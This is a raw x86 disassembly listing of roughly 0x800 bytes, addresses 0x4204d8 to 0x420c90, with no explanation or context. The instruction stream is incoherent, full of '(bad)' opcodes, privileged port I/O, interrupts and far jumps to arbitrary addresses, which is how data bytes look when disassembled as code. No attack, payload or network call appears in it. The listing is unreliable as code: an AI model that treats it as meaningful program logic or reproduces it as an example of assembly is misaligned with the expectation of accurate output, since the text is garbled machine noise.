  4204d8:	sub    ebx,edi
  4204da:	fld    QWORD PTR [esi-0x6f429a95]
  4204e0:	mov    esp,tr4
  4204e3:	into   
  4204e4:	seta   BYTE PTR [eax]
  4204e7:	clc    
  4204e8:	iret   
  4204e9:	pop    ebp
  4204ea:	call   0x5c66994a
  4204ef:	xlat   BYTE PTR ds:[ebx]
  4204f0:	inc    esp
  4204f1:	dec    eax
  4204f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204f3:	mov    ds:0x76e1913,al
  4204f8:	call   0x2f0c:0x8f6083a1
  4204ff:	cmp    eax,DWORD PTR [eax+0x1]
  420502:	and    ah,bh
  420504:	dec    esp
  420505:	ret    
  420506:	mov    esp,0x69a497f6
  42050b:	leave  
  42050c:	sar    BYTE PTR [eax+0x47f53025],1
  420512:	inc    ecx
  420513:	ins    DWORD PTR es:[edi],dx
  420514:	add    DWORD PTR [eax+0x2b36e821],ecx
  42051a:	adc    esp,DWORD PTR [edx+0x4f]
  42051d:	jecxz  0x4204bd
  42051f:	ss nop
  420521:	inc    ebp
  420522:	mov    esi,0x62daadf3
  420527:	out    0x8d,al
  420529:	sub    edi,DWORD PTR ds:0xa03d072f
  42052f:	clc    
  420530:	sub    eax,0x5c97e8bf
  420535:	ss xchg ebp,eax
  420537:	mov    al,ds:0x90efbcb5
  42053c:	sar    BYTE PTR [eax],1
  42053e:	adc    al,0xb3
  420540:	dec    ecx
  420541:	inc    edi
  420542:	mov    BYTE PTR [eax-0x7b],dl
  420545:	fstp   st(7)
  420547:	mov    esi,0xbed1b9e3
  42054c:	push   ebx
  42054d:	pusha  
  42054e:	mov    ecx,0x5f316239
  420553:	lds    ebx,FWORD PTR [eax+0x4a149465]
  420559:	dec    ebp
  42055a:	xchg   bl,dh
  42055c:	es popa 
  42055e:	data16 daa 
  420560:	sbb    BYTE PTR [eax],ah
  420562:	cs xchg edi,eax
  420564:	dec    esp
  420565:	mov    ah,0xfa
  420567:	pop    ds
  420568:	jl     0x4205be
  42056a:	cld    
  42056b:	(bad)  
  42056c:	lock adc DWORD PTR ds:[eax],ecx
  420570:	cmc    
  420571:	pop    edi
  420572:	dec    ebp
  420573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420574:	js     0x42055a
  420576:	cmp    BYTE PTR [ecx],cl
  420578:	push   0x2
  42057a:	or     ch,0x2f
  42057d:	inc    ebp
  42057e:	ror    DWORD PTR [ebp+0x3ae88ce8],cl
  420584:	push   esp
  420585:	fimul  DWORD PTR [edx]
  420587:	es dec esp
  420589:	stos   DWORD PTR es:[edi],eax
  42058a:	pusha  
  42058b:	popa   
  42058c:	or     BYTE PTR [ebx+0x5e],dl
  42058f:	sub    al,0x8d
  420591:	pop    esp
  420592:	popa   
  420593:	xlat   BYTE PTR ds:[ebx]
  420594:	jp     0x4205a3
  420596:	cmp    edi,DWORD PTR [eax]
  420598:	dec    edi
  420599:	jmp    0xa689a4c1
  42059e:	pop    eax
  42059f:	jno    0x420542
  4205a1:	in     al,dx
  4205a2:	imul   ebx,edx,0xffffffe2
  4205a5:	je     0x42056e
  4205a7:	neg    bl
  4205a9:	call   0x7d69:0x61be6853
  4205b0:	jecxz  0x420622
  4205b2:	jmp    0x4205dd
  4205b4:	and    ecx,DWORD PTR [ecx]
  4205b6:	cwde   
  4205b7:	or     DWORD PTR [ebx-0x2a],edi
  4205ba:	cmc    
  4205bb:	inc    eax
  4205bc:	retf   0x89a
  4205bf:	fcos   
  4205c1:	(bad)  
  4205c3:	nop
  4205c4:	xchg   DWORD PTR [edi-0x12bc6f49],edi
  4205ca:	inc    esi
  4205cb:	sub    bl,BYTE PTR [edx+0x1a729c98]
  4205d1:	dec    edx
  4205d2:	stc    
  4205d3:	(bad)  
  4205d5:	call   0x4ee276dd
  4205da:	jb     0x4205bb
  4205dc:	pop    ecx
  4205dd:	cwde   
  4205de:	adc    eax,DWORD PTR [ecx]
  4205e0:	add    BYTE PTR [edi+0x5c25e43f],ch
  4205e6:	pop    eax
  4205e7:	lods   eax,DWORD PTR ds:[esi]
  4205e8:	adc    eax,0x96f49e85
  4205ed:	push   0xfe0a3fe9
  4205f2:	repnz dec edx
  4205f4:	jnp    0x420576
  4205f6:	adc    al,0xda
  4205f8:	inc    edx
  4205f9:	(bad)  
  4205fa:	push   edi
  4205fb:	arpl   WORD PTR [ecx+0x718edffb],dx
  420601:	adc    BYTE PTR [ebx-0xc],0xca
  420605:	mov    cl,0x7d
  420607:	enter  0xcd46,0x83
  42060b:	dec    edx
  42060c:	sub    al,0x2d
  42060e:	in     eax,0x7b
  420610:	xchg   ebx,eax
  420611:	jle    0x4205e4
  420613:	mov    bl,0x12
  420615:	or     DWORD PTR [edx],ebx
  420617:	and    eax,0x443a9d46
  42061c:	pop    ecx
  42061d:	mov    dl,0xa7
  42061f:	mov    DWORD PTR ds:0x6b71807c,ebx
  420625:	sub    al,BYTE PTR ds:[edx]
  420628:	cwde   
  420629:	int    0xdf
  42062b:	mov    ebx,0x9463d910
  420630:	bound  eax,QWORD PTR [ebx+0x489c4d3c]
  420636:	lea    esi,[eax+0x20]
  420639:	sub    al,0x77
  42063b:	je     0x42069b
  42063d:	xor    eax,0xa144c7c2
  420642:	xchg   esi,eax
  420643:	sti    
  420644:	mov    fs,WORD PTR [ebp-0x23]
  420647:	ds mov edx,0x532dcf73
  42064d:	mov    bl,0x73
  42064f:	mov    dl,ch
  420651:	shl    esi,cl
  420653:	xor    al,BYTE PTR [edx+ebx*4]
  420656:	push   cs
  420657:	(bad)  
  420658:	pop    ds
  420659:	mov    al,0x9
  42065b:	dec    esi
  42065c:	sub    eax,0x991a0780
  420661:	or     al,0xa
  420663:	es imul esi,edx,0xdd60391e
  42066a:	and    DWORD PTR [ebx-0x34cf367f],ecx
  420670:	jo     0x4206ce
  420672:	mov    cl,0xa6
  420674:	jbe    0x42061f
  420676:	cmp    eax,0x5f122e56
  42067b:	jmp    0x6b4acc4a
  420680:	fisub  DWORD PTR [edi]
  420682:	stc    
  420683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420684:	shl    DWORD PTR [edi+edx*4],cl
  420687:	rcl    DWORD PTR [edi],1
  420689:	cs inc ebx
  42068b:	inc    edx
  42068c:	mov    eax,0xdb1a70e0
  420691:	dec    edi
  420692:	std    
  420693:	mov    edx,0x11367558
  420698:	shr    BYTE PTR [ebx-0xe99e48b],1
  42069e:	pop    esp
  42069f:	inc    edx
  4206a0:	je     0x420641
  4206a2:	mov    eax,ds:0x6cb08beb
  4206a7:	cdq    
  4206a8:	push   ebx
  4206a9:	sbb    BYTE PTR [esi+edx*2],ah
  4206ac:	adc    DWORD PTR cs:[eax-0x19],ecx
  4206b0:	pop    eax
  4206b1:	sub    BYTE PTR [ebp+0x41],al
  4206b4:	icebp  
  4206b5:	adc    eax,0xcda694ae
  4206ba:	mov    ah,0xc8
  4206bc:	push   esp
  4206bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206be:	aad    0xc7
  4206c0:	sbb    dh,0x3c
  4206c3:	out    0xf4,al
  4206c5:	inc    ebp
  4206c6:	xor    al,0xfc
  4206c8:	enter  0xbf21,0xd4
  4206cc:	bound  ebx,QWORD PTR [edx]
  4206ce:	scas   al,BYTE PTR es:[edi]
  4206cf:	mov    ebx,0xab2ae6fd
  4206d4:	push   ss
  4206d5:	loopne 0x4206fc
  4206d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206d8:	dec    edi
  4206d9:	jns    0x420758
  4206db:	adc    eax,0x8d0bf899
  4206e0:	and    DWORD PTR [ebx-0x47],eax
  4206e3:	stc    
  4206e4:	aaa    
  4206e5:	cdq    
  4206e6:	jecxz  0x4206e7
  4206e8:	out    dx,al
  4206e9:	or     ch,BYTE PTR [edx]
  4206eb:	xchg   ebp,eax
  4206ec:	dec    esp
  4206ed:	cld    
  4206ee:	std    
  4206ef:	std    
  4206f0:	jecxz  0x42076e
  4206f2:	mul    ebp
  4206f4:	push   es
  4206f5:	fild   QWORD PTR [edx+edx*8]
  4206f8:	sbb    BYTE PTR ds:0xf8fae282,dl
  4206fe:	mov    dl,0xab
  420700:	repnz pop ebx
  420702:	fcom   DWORD PTR [ebp+0x6]
  420705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420706:	test   eax,0xb8762823
  42070b:	scas   al,BYTE PTR es:[edi]
  42070c:	dec    esp
  42070d:	int    0xf1
  42070f:	fwait
  420710:	(bad)  
  420711:	in     eax,0xd9
  420713:	inc    edi
  420714:	sbb    BYTE PTR [ebp-0x7815dcd7],al
  42071a:	sti    
  42071b:	adc    DWORD PTR [edx+0xb],ebp
  42071e:	inc    esp
  42071f:	sbb    DWORD PTR [esi],0x1573c961
  420725:	mov    eax,gs:0xb799b3ac
  42072b:	push   esp
  42072c:	call   0xa2be414b
  420731:	and    BYTE PTR [ecx],dh
  420733:	mul    BYTE PTR [eax]
  420735:	out    0xf6,eax
  420737:	adc    BYTE PTR [ecx+0x23],0x3d
  42073b:	mov    ah,0x73
  42073d:	lahf   
  42073e:	cmp    BYTE PTR [ecx-0x3d8d98d0],bh
  420744:	idiv   bh
  420746:	add    eax,0x686f726b
  42074b:	push   edx
  42074c:	imul   edx,eax,0xffffffdf
  42074f:	pop    ebp
  420750:	test   eax,0x345f682a
  420755:	cs jl  0x42075e
  420758:	cs mov ah,0xd
  42075b:	fcmovbe st,st(0)
  42075d:	lods   al,BYTE PTR ds:[esi]
  42075e:	adc    esi,ebx
  420760:	or     al,0xfb
  420762:	nop
  420763:	and    eax,0x8e70c8b1
  420768:	or     al,0x3a
  42076a:	stc    
  42076b:	cs sub al,0xc6
  42076e:	mov    al,0xb8
  420770:	push   ecx
  420771:	and    esp,DWORD PTR [ebx+0x7f4c7d9]
  420777:	pop    edi
  420778:	mov    bh,0x7d
  42077a:	pop    esp
  42077b:	out    dx,al
  42077c:	dec    edx
  42077d:	(bad)  
  42077e:	or     al,0xd6
  420780:	inc    edx
  420781:	cwde   
  420782:	stos   BYTE PTR es:[edi],al
  420783:	aad    0xef
  420785:	js     0x420777
  420787:	fisub  WORD PTR [eax-0x51cf712c]
  42078d:	fdivr  DWORD PTR [esi+0x38e18ddd]
  420793:	dec    eax
  420794:	sahf   
  420795:	pushf  
  420796:	jmp    0x2384:0xa273fcd9
  42079d:	dec    edx
  42079e:	ror    ecx,cl
  4207a0:	mov    dl,0x6a
  4207a2:	nop
  4207a3:	inc    ebp
  4207a4:	mov    bl,0xbc
  4207a6:	dec    ecx
  4207a7:	in     eax,0x39
  4207a9:	lea    ebx,[esi-0xe]
  4207ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207ad:	aaa    
  4207ae:	and    ch,0xd9
  4207b1:	pop    edx
  4207b2:	int    0x2f
  4207b4:	jle    0x420834
  4207b6:	jecxz  0x420825
  4207b8:	mov    bl,0xb1
  4207ba:	outs   dx,BYTE PTR ds:[esi]
  4207bb:	push   ebx
  4207bc:	repz inc esi
  4207be:	push   edi
  4207bf:	jg     0x4207a7
  4207c1:	outs   dx,BYTE PTR ds:[esi]
  4207c2:	loop   0x42082e
  4207c4:	xchg   edx,eax
  4207c5:	iret   
  4207c6:	aas    
  4207c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207c8:	jp     0x42079b
  4207ca:	(bad)  
  4207cb:	scas   al,BYTE PTR es:[edi]
  4207cc:	xchg   edi,eax
  4207cd:	push   ecx
  4207ce:	sbb    edi,edx
  4207d0:	push   esi
  4207d1:	rcr    dh,cl
  4207d3:	int3   
  4207d4:	fldenv [eax-0x6d]
  4207d7:	mov    ds:0x9b080cf0,eax
  4207dc:	pop    ecx
  4207dd:	jnp    0x4207e1
  4207df:	dec    edx
  4207e0:	in     eax,0x5
  4207e2:	loope  0x4207ed
  4207e4:	test   DWORD PTR [esi-0x6a],esi
  4207e7:	out    dx,al
  4207e8:	mov    ebx,0x3bb7589f
  4207ed:	xchg   edx,eax
  4207ee:	cmp    eax,0x5ae3fc82
  4207f3:	leave  
  4207f4:	shl    edi,0x5b
  4207f7:	outs   dx,DWORD PTR ds:[esi]
  4207f8:	mov    ecx,0x692e1333
  4207fd:	push   cs
  4207fe:	or     BYTE PTR ds:0xfb560af9,al
  420804:	idiv   DWORD PTR ds:0x88c421f5
  42080a:	arpl   WORD PTR [ebx],cx
  42080c:	pop    edi
  42080d:	(bad)  
  42080e:	adc    dl,dl
  420810:	xlat   BYTE PTR ds:[ebx]
  420811:	add    DWORD PTR [ebp+0x28],edi
  420814:	cmp    BYTE PTR [edi+eiz*4-0x38f9cb09],bh
  42081b:	mov    ecx,0x1a84243a
  420820:	lods   eax,DWORD PTR ds:[esi]
  420821:	mov    bl,0xc6
  420823:	hlt    
  420824:	adc    ch,al
  420826:	push   ecx
  420827:	(bad)
  42082a:	(bad)  
  42082b:	cdq    
  42082c:	xchg   ecx,eax
  42082d:	lods   al,BYTE PTR ds:[esi]
  42082e:	scas   al,BYTE PTR es:[edi]
  42082f:	push   0xffffffb4
  420831:	mov    cl,0x1
  420833:	aad    0x63
  420835:	jle    0x4208a4
  420837:	jg     0x42080a
  420839:	xchg   ecx,eax
  42083a:	or     BYTE PTR [ecx-0x37f0f2a1],al
  420840:	dec    ecx
  420841:	popa   
  420842:	aaa    
  420843:	inc    eax
  420844:	repnz cld 
  420846:	xlat   BYTE PTR ds:[ebx]
  420847:	xchg   esi,eax
  420848:	or     edx,ecx
  42084a:	pop    ebp
  42084b:	cdq    
  42084c:	dec    ecx
  42084d:	push   0x63
  42084f:	sar    DWORD PTR [edx+0x2f75d083],0x2b
  420856:	call   0x7533:0x5db09d08
  42085d:	jmp    0x50d14790
  420862:	pop    ebx
  420863:	inc    esp
  420864:	lods   al,BYTE PTR ds:[esi]
  420865:	in     eax,0x3e
  420867:	dec    ecx
  420868:	test   ecx,eax
  42086a:	daa    
  42086b:	fwait
  42086c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42086d:	dec    edi
  42086e:	repz dec edx
  420870:	add    ebx,DWORD PTR [esi-0x61788567]
  420876:	repz xor dl,cl
  420879:	sub    cl,BYTE PTR [ebp+ebx*1+0x74f544db]
  420880:	jns    0x4208c5
  420882:	add    BYTE PTR [ecx+0xe],ah
  420885:	xchg   esp,eax
  420886:	test   eax,0xb007a7a9
  42088b:	inc    ecx
  42088c:	xchg   esp,eax
  42088d:	or     edi,DWORD PTR [ebx-0x2b5ed637]
  420893:	jp     0x420888
  420895:	retf   0xff3
  420898:	es inc ebp
  42089a:	mov    edi,0xe7d569c7
  42089f:	pop    ecx
  4208a0:	pop    edi
  4208a1:	sub    eax,0x98c717a5
  4208a6:	repnz sub edx,DWORD PTR [edi]
  4208a9:	add    ecx,DWORD PTR [eax+eax*2]
  4208ac:	lods   eax,DWORD PTR ds:[esi]
  4208ad:	mov    dl,0x5
  4208af:	fwait
  4208b0:	in     al,dx
  4208b1:	(bad)  
  4208b2:	cld    
  4208b3:	test   al,0x84
  4208b5:	mov    al,ds:0xfa44009e
  4208ba:	lds    eax,FWORD PTR [eax]
  4208bc:	ins    DWORD PTR es:[edi],dx
  4208bd:	(bad)  
  4208be:	lods   al,BYTE PTR ds:[esi]
  4208bf:	pop    esp
  4208c0:	enter  0xdfc5,0xbe
  4208c4:	xor    cl,dl
  4208c6:	sahf   
  4208c7:	inc    ecx
  4208c8:	test   DWORD PTR [edi+0xb899f72],edx
  4208ce:	sar    ebx,1
  4208d0:	test   dh,ah
  4208d2:	xchg   BYTE PTR [ecx-0x404ef6c7],ah
  4208d8:	mov    dh,0x7b
  4208da:	mov    ebp,0x1a04f2b7
  4208df:	clc    
  4208e0:	pop    ds
  4208e1:	emms   
  4208e3:	inc    eax
  4208e4:	mov    al,0xdb
  4208e6:	push   ecx
  4208e7:	cmp    eax,0xb203574b
  4208ec:	ficom  DWORD PTR [eax+0x6d]
  4208ef:	test   BYTE PTR [edi-0x42],ch
  4208f2:	and    al,0xf7
  4208f4:	pusha  
  4208f5:	xchg   ecx,eax
  4208f6:	retf   
  4208f7:	mov    dl,0x39
  4208f9:	push   edi
  4208fa:	xchg   edx,eax
  4208fb:	xchg   ebx,eax
  4208fc:	out    dx,al
  4208fd:	test   ah,cl
  4208ff:	(bad)  
  420900:	pop    eax
  420901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420902:	cmp    ch,0x2d
  420905:	mov    ds:0xbc8439c1,eax
  42090a:	std    
  42090b:	fistp  QWORD PTR [esi]
  42090d:	(bad)  
  42090e:	xor    WORD PTR [ebx+0x16876693],0x1715
  420917:	mov    bl,dh
  420919:	sbb    DWORD PTR [esi-0x51],ecx
  42091c:	push   0x4cf8f578
  420921:	sub    bh,ah
  420923:	popa   
  420924:	test   ah,ch
  420926:	xor    eax,0x3e437790
  42092b:	mov    edi,0x6f3f65c7
  420930:	cmp    DWORD PTR [ecx+0x7],edx
  420933:	and    BYTE PTR [ebp-0x8],al
  420936:	retf   0x30f4
  420939:	and    bh,BYTE PTR [esp+ecx*2+0x41]
  42093d:	or     DWORD PTR [eax-0x1484bb2c],edi
  420943:	fst    DWORD PTR [eax]
  420945:	dec    edi
  420946:	xchg   esi,eax
  420947:	mov    bl,0x33
  420949:	cmp    al,BYTE PTR [edi+eax*8+0x5bff30a6]
  420950:	inc    BYTE PTR [eax+0x309e17a1]
  420956:	inc    ebp
  420957:	push   ds
  420958:	out    0x81,al
  42095a:	inc    eax
  42095b:	enter  0x47b0,0xed
  42095f:	push   esi
  420960:	sar    DWORD PTR [ebx+0x1e540607],0xb6
  420967:	xchg   ecx,eax
  420968:	fist   DWORD PTR [ebp-0x5eedb37a]
  42096e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42096f:	in     al,0xd5
  420971:	mov    BYTE PTR [eax-0x19727037],dl
  420977:	enter  0xb580,0x4c
  42097b:	dec    ebp
  42097c:	add    BYTE PTR [edx+0x2b],ch
  42097f:	ror    BYTE PTR [edx+0x1],1
  420982:	in     al,0x62
  420984:	sbb    al,0xe4
  420986:	fucomi st,st(6)
  420988:	jg     0x42094e
  42098a:	stc    
  42098b:	xchg   BYTE PTR [ebp-0x6d2e3eb8],bl
  420991:	sahf   
  420992:	mov    ebp,0x26a93a4f
  420997:	repz shl cl,0xd3
  42099b:	(bad)  
  42099d:	pushf  
  42099e:	leave  
  42099f:	fsub   st,st(3)
  4209a1:	jne    0x42099c
  4209a3:	mov    esp,0x771c08c8
  4209a8:	shl    ch,cl
  4209aa:	mov    ebp,0xeb0b6c40
  4209af:	xlat   BYTE PTR ds:[ebx]
  4209b0:	test   eax,0x95f63852
  4209b5:	pop    ds
  4209b6:	out    dx,al
  4209b7:	or     cl,al
  4209b9:	jns    0x420a05
  4209bb:	and    ebp,DWORD PTR [esi]
  4209bd:	in     eax,dx
  4209be:	repz add DWORD PTR [esi],0xd74dad10
  4209c5:	xor    bl,al
  4209c7:	fld    TBYTE PTR [eax]
  4209c9:	inc    edi
  4209ca:	xor    ch,BYTE PTR [ebx-0x8]
  4209cd:	outs   dx,BYTE PTR ds:[esi]
  4209ce:	retf   0x3117
  4209d1:	int3   
  4209d2:	popf   
  4209d3:	mov    ebp,0xa495b6f
  4209d8:	fild   WORD PTR [eax+0x42]
  4209db:	rol    BYTE PTR [eax-0x2b],cl
  4209de:	fs stos BYTE PTR es:[edi],al
  4209e0:	jp     0x420962
  4209e2:	int3   
  4209e3:	fisttp QWORD PTR [edi+0x36d1e1ea]
  4209e9:	xchg   edi,eax
  4209ea:	jge    0x4209af
  4209ec:	adc    DWORD PTR [eax+0x2228e1fa],eax
  4209f2:	out    0x9d,eax
  4209f4:	nop
  4209f5:	jne    0x420a31
  4209f7:	lock test al,0xf
  4209fa:	in     al,dx
  4209fb:	dec    eax
  4209fc:	mov    DWORD PTR [ebx],0xf21f6194
  420a02:	shr    BYTE PTR ds:0x36330e87,cl
  420a08:	stos   DWORD PTR es:[edi],eax
  420a09:	(bad)  
  420a0a:	pop    esp
  420a0b:	inc    esi
  420a0c:	push   ds
  420a0d:	call   0xd66998a3
  420a12:	xchg   edx,eax
  420a13:	outs   dx,BYTE PTR ds:[esi]
  420a14:	es or  bl,cl
  420a17:	dec    ebp
  420a18:	pop    es
  420a19:	(bad)  
  420a1a:	test   eax,0x9e322f9b
  420a1f:	test   al,0x2f
  420a21:	inc    edi
  420a22:	add    edx,ebx
  420a24:	or     eax,0xb002bcff
  420a29:	sub    eax,0xad563872
  420a2e:	and    al,0xf9
  420a30:	or     BYTE PTR [esi-0x2c83f882],0x8a
  420a37:	or     al,0x5
  420a39:	cli    
  420a3a:	dec    ecx
  420a3b:	fild   QWORD PTR es:[ecx+eax*1+0x63a09b2d]
  420a43:	jmp    0xfee8019e
  420a48:	fstp   QWORD PTR [esi-0x1]
  420a4b:	mov    eax,0x6bf66e2d
  420a50:	mov    edi,0x2665d902
  420a55:	repz aaa 
  420a57:	jp     0x420ad0
  420a59:	in     al,dx
  420a5a:	clc    
  420a5b:	call   DWORD PTR [ebp+0xa2248be]
  420a61:	jb     0x420ace
  420a63:	aas    
  420a64:	mov    DWORD PTR [edi],edx
  420a66:	(bad)  
  420a67:	dec    esi
  420a68:	retf   
  420a69:	mov    BYTE PTR [ebx+0x36],dh
  420a6c:	loopne 0x420a04
  420a6e:	inc    edi
  420a6f:	jp     0x420ade
  420a71:	dec    eax
  420a72:	mov    gs,edi
  420a74:	out    dx,al
  420a75:	pop    ecx
  420a76:	inc    ecx
  420a77:	or     eax,0x1e272ec7
  420a7c:	test   eax,0xd0c43a0c
  420a82:	test   ebx,0x30c70174
  420a88:	push   esp
  420a89:	sbb    ebp,DWORD PTR [ebx]
  420a8b:	jp     0x420a92
  420a8d:	dec    esi
  420a8e:	icebp  
  420a8f:	test   BYTE PTR [eax+edx*4],bh
  420a92:	mov    cl,0xbb
  420a94:	mov    dl,0x35
  420a96:	add    eax,0x1107db24
  420a9b:	fisub  WORD PTR [ecx-0x5d]
  420a9e:	xchg   edi,eax
  420a9f:	out    dx,al
  420aa0:	ret    0xe9
  420aa3:	lds    ebx,FWORD PTR [eax+0x76]
  420aa6:	inc    ebp
  420aa7:	jl     0x420ab1
  420aa9:	lea    ecx,[esp+ebx*2+0x5]
  420aad:	jg     0x420a33
  420aaf:	ss push ds
  420ab1:	repnz fs cmp DWORD PTR es:[edx],esp
  420ab6:	and    BYTE PTR [ecx],bl
  420ab8:	sub    al,0xb1
  420aba:	(bad)  
  420abb:	out    dx,al
  420abc:	jnp    0x420a8c
  420abe:	cmp    BYTE PTR [ebx+esi*2+0x12ebfeeb],ah
  420ac5:	mov    ds:0xa9cb06fb,eax
  420aca:	mov    bl,0x41
  420acc:	jecxz  0x420b2d
  420ace:	or     DWORD PTR [edx+0x65],eax
  420ad1:	in     eax,dx
  420ad2:	cmp    ecx,ebp
  420ad4:	inc    edx
  420ad5:	xchg   DWORD PTR [ebx-0x76523cd5],esp
  420adb:	add    eax,0x8b9a12e5
  420ae0:	bnd jmp 0x420afd
  420ae3:	stos   BYTE PTR es:[edi],al
  420ae4:	sub    al,0x60
  420ae6:	jmp    0x1a54beaa
  420aeb:	xchg   esi,eax
  420aec:	cmp    al,0xa4
  420aee:	sbb    DWORD PTR [ecx+ebp*4+0x46ff0c44],esp
  420af5:	mov    ebx,0xb5cd8a23
  420afa:	mov    cl,0xbb
  420afc:	jmp    0x41da:0x68b93f6e
  420b03:	sbb    DWORD PTR [edi+0x40],ecx
  420b06:	xchg   edx,edi
  420b08:	sub    ah,al
  420b0a:	(bad)  
  420b0c:	mov    ds:0xed11efb6,al
  420b11:	xor    al,0xd6
  420b13:	js     0x420aaa
  420b15:	(bad)  
  420b16:	mov    al,0x9f
  420b18:	popa   
  420b19:	push   ss
  420b1a:	add    BYTE PTR ds:[ebx-0x72a32c90],0x19
  420b22:	out    dx,al
  420b23:	jmp    0x420afa
  420b25:	xchg   DWORD PTR [eax],ebp
  420b27:	xchg   BYTE PTR [ebp-0x5bf03c76],al
  420b2d:	pop    esi
  420b2e:	push   esp
  420b2f:	jle    0x420b8e
  420b31:	daa    
  420b32:	fdivr  QWORD PTR ds:0x7139b169
  420b38:	stos   DWORD PTR es:[edi],eax
  420b39:	clc    
  420b3a:	ret    
  420b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b3c:	hlt    
  420b3d:	shl    BYTE PTR [esi+0x15],0xec
  420b41:	or     al,0xf1
  420b43:	add    eax,0xc8c784f0
  420b48:	inc    ebp
  420b49:	imul   edi,DWORD PTR [ebx+0x27],0xffffffff
  420b4d:	je     0x420b00
  420b4f:	bound  ebx,QWORD PTR [esi-0x2e09e33d]
  420b55:	in     al,0xf8
  420b57:	xlat   BYTE PTR ds:[ebx]
  420b58:	enter  0xe347,0xbc
  420b5c:	ins    BYTE PTR es:[edi],dx
  420b5d:	fisub  DWORD PTR [ecx-0xbcd87bf]
  420b63:	cmp    DWORD PTR [ecx],ebp
  420b65:	xchg   DWORD PTR [edi+0x3b],edx
  420b68:	hlt    
  420b69:	sub    al,0x64
  420b6b:	std    
  420b6c:	outs   dx,DWORD PTR ds:[esi]
  420b6d:	xchg   edx,eax
  420b6e:	pop    edx
  420b6f:	adc    BYTE PTR [ebx-0x34],ah
  420b72:	in     eax,0x14
  420b74:	pop    esp
  420b75:	call   0x95ddd1d2
  420b7a:	imul   esi,DWORD PTR [edx],0x7bb9f57a
  420b80:	pushf  
  420b81:	pusha  
  420b82:	or     BYTE PTR [esi+ebp*4-0x16],bl
  420b86:	push   ebx
  420b87:	mov    ss,WORD PTR [ebx]
  420b89:	imul   esi,ecx,0xbb405aec
  420b8f:	das    
  420b90:	mov    ebp,0xd31ae7f9
  420b95:	lahf   
  420b96:	add    ebx,edi
  420b98:	jns    0x420b91
  420b9a:	sub    eax,0xf89c4bd5
  420b9f:	jp     0x420bee
  420ba1:	pop    ds
  420ba2:	and    esi,DWORD PTR [edx-0x80]
  420ba5:	or     eax,0x83983f9d
  420baa:	lock fild QWORD PTR [eax-0x5a]
  420bae:	ins    DWORD PTR es:[edi],dx
  420baf:	xlat   BYTE PTR ds:[ebx]
  420bb0:	jne    0x420b57
  420bb2:	(bad)  
  420bb3:	ror    eax,1
  420bb5:	lods   al,BYTE PTR ds:[esi]
  420bb6:	add    BYTE PTR [edx-0x2f88af07],bl
  420bbc:	jae    0x420b5e
  420bbe:	in     eax,dx
  420bbf:	xor    DWORD PTR [edi],esp
  420bc1:	sub    DWORD PTR [ecx+ecx*8-0x4d],eax
  420bc5:	out    0x5a,al
  420bc7:	dec    edx
  420bc8:	xchg   esi,eax
  420bc9:	outs   dx,BYTE PTR fs:[esi]
  420bcb:	int3   
  420bcc:	mov    ch,0x1e
  420bce:	pop    esi
  420bcf:	mov    ebx,0x15074b81
  420bd4:	add    al,0x8e
  420bd6:	test   eax,0x731ee015
  420bdb:	xor    eax,DWORD PTR [edi+0x3188f0ec]
  420be1:	inc    edi
  420be2:	pop    edi
  420be3:	lahf   
  420be4:	inc    ecx
  420be6:	xchg   ebp,eax
  420be7:	cmc    
  420be8:	cmp    BYTE PTR [ecx],ch
  420bea:	pop    edi
  420beb:	sbb    dl,BYTE PTR [edi+0x6]
  420bee:	or     ch,dh
  420bf0:	xor    ah,bh
  420bf2:	clc    
  420bf3:	jg     0x420c36
  420bf5:	dec    ebp
  420bf6:	mov    WORD PTR [ecx+0x5c16fe4b],ds
  420bfc:	stos   BYTE PTR es:[edi],al
  420bfd:	xor    BYTE PTR [eax+eiz*2],bl
  420c00:	cs push 0x1afacc67
  420c06:	add    BYTE PTR [ebp+0x78],ch
  420c09:	imul   esi,DWORD PTR [ebp+0x17],0x60
  420c0d:	xchg   DWORD PTR [eax-0x11],eax
  420c10:	test   DWORD PTR [esi-0x34d16a4a],0x27cfe136
  420c1a:	in     al,dx
  420c1b:	cli    
  420c1c:	(bad)  
  420c1d:	jmp    0x3012:0xa330ddbe
  420c24:	xor    BYTE PTR [eax],al
  420c26:	jg     0x420bcf
  420c28:	sub    esi,ebp
  420c2a:	dec    esp
  420c2b:	ficomp DWORD PTR [eax]
  420c2d:	mov    dl,0x8b
  420c2f:	inc    ecx
  420c30:	cmp    eax,0xbffbbc3b
  420c35:	xor    cl,bl
  420c37:	cs test eax,0x98f14fe3
  420c3d:	jno    0x420c18
  420c3f:	mov    BYTE PTR [edi],dl
  420c41:	mov    al,ds:0x8c06f7ad
  420c46:	fidivr WORD PTR [esi]
  420c48:	adc    DWORD PTR [edi-0x63b5f81f],ebp
  420c4e:	mov    gs,WORD PTR [edx+0x14]
  420c51:	jmp    0x1f2bf9d3
  420c56:	ret    
  420c57:	mov    al,0x50
  420c59:	jo     0x420c00
  420c5b:	loop   0x420c5a
  420c5d:	mov    ecx,0x22c1249b
  420c62:	lods   eax,DWORD PTR ds:[esi]
  420c63:	fwait
  420c64:	imul   ebx,DWORD PTR [ebx+ecx*4-0x7b878fbd],0xffffffa5
  420c6c:	cdq    
  420c6d:	jb     0x420c98
  420c6f:	cs push es
  420c71:	(bad)  
  420c72:	xchg   edi,eax
  420c73:	cwde   
  420c74:	(bad)  
  420c75:	xchg   ecx,eax
  420c76:	sub    DWORD PTR [eax+ecx*8+0x6f],edi
  420c7a:	call   FWORD PTR [si]
  420c7d:	mov    ebp,0xe406ce91
  420c82:	push   ss
  420c83:	jecxz  0x420c83
  420c85:	and    BYTE PTR [ecx-0x70],cl
  420c88:	xchg   esp,eax
  420c89:	in     eax,dx
  420c8a:	sub    al,0x80
  420c8c:	or     al,0x2
  420c8e:	inc    esp
  420c8f:	icebp  
  420c90:	fadd   QWORD PTR [ecx]
